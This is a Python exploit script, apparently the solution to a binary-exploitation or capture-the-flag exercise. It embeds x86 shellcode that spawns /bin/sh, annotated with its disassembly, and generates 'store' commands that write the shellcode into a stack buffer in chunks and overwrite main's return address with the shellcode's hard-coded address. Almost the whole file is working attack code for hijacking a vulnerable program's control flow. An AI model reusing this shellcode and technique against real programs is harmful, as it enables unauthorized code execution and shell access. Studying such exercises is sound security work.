import struct
import sys

shellcode = b"\x31\xC0\x50\xEB\x2B\x5B\xEB\x04\xCC\xCC\xCC\xCC\x83\xC3\x07\x31\xC9\x90\xEB\x04\xCC\xCC\xCC\xCC\x31\xD2\x31\xC0\xB0\x0B\xEB\x04\xCC\xCC\xCC\xCC\xCD\x80\x31\xC0\x40\xCD\x80\x90\xCC\xCC\xCC\xCC\xE8\xD0\xFF\xFF\xFF\x90\x90\x90\xCC\xCC\xCC\xCC/bin/sh\x00"

"""
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  eb 2b                   jmp    30 <bin>
00000005 <back_bin>:
5:  5b                      pop    ebx
6:  eb 04                   jmp    c <hop1>
8:  cc                      int3
9:  cc                      int3
a:  cc                      int3
b:  cc                      int3
0000000c <hop1>:
c:  83 c3 07                add    ebx,0x7
f:  31 c9                   xor    ecx,ecx
11: 90                      nop
12: eb 04                   jmp    18 <hop2>
14: cc                      int3
15: cc                      int3
16: cc                      int3
17: cc                      int3
00000018 <hop2>:
18: 31 d2                   xor    edx,edx
1a: 31 c0                   xor    eax,eax
1c: b0 0b                   mov    al,0xb
1e: eb 04                   jmp    24 <hop3>
20: cc                      int3
21: cc                      int3
22: cc                      int3
23: cc                      int3
00000024 <hop3>:
24: cd 80                   int    0x80
26: 31 c0                   xor    eax,eax
28: 40                      inc    eax
29: cd 80                   int    0x80
2b: 90                      nop
2c: cc                      int3
2d: cc                      int3
2e: cc                      int3
2f: cc                      int3
00000030 <bin>:
30: e8 d0 ff ff ff          call   5 <back_bin>
35: 90                      nop
36: 90                      nop
37: 90                      nop
38: cc                      int3
39: cc                      int3
3a: cc                      int3
3b: cc                      int3
0000003c <bin_str>: "/bin/sh\x00"
"""

STORE = "store\n"

# Need to write input that will write 8 of every 12 bytes in their appropriate place

# buf_addr = 0xbffff548 # In gdb
buf_addr = 0xbffff4e8 # Without gdb
main_ra_offset = 436

index = 1
shellcode_addr = buf_addr + index*4 +16 # Start the shell code at the first index we use

assert(len(shellcode) / 4 == len(shellcode) // 4)
num_chucks = len(shellcode) // 4
commands = []
for i in range(num_chucks):
    chunk = shellcode[i*4:i*4+4]
    if index % 3 == 0:
        # Skip over every third chunk
        assert(chunk == b"\xCC\xCC\xCC\xCC")
        index += 1
        continue
    print(chunk, file=sys.stderr)
    value = struct.unpack("<L", chunk)[0]
    print(hex(value), file=sys.stderr)
    commands.append(STORE + str(value) + "\n" + str(index) + "\n")
    index += 1

# Overwrite RA on stack with address of shellcode
index = main_ra_offset//4
commands.append(STORE + str(shellcode_addr) + "\n" + str(index) + "\n")

commands.append("quit\n")
print("".join(commands))
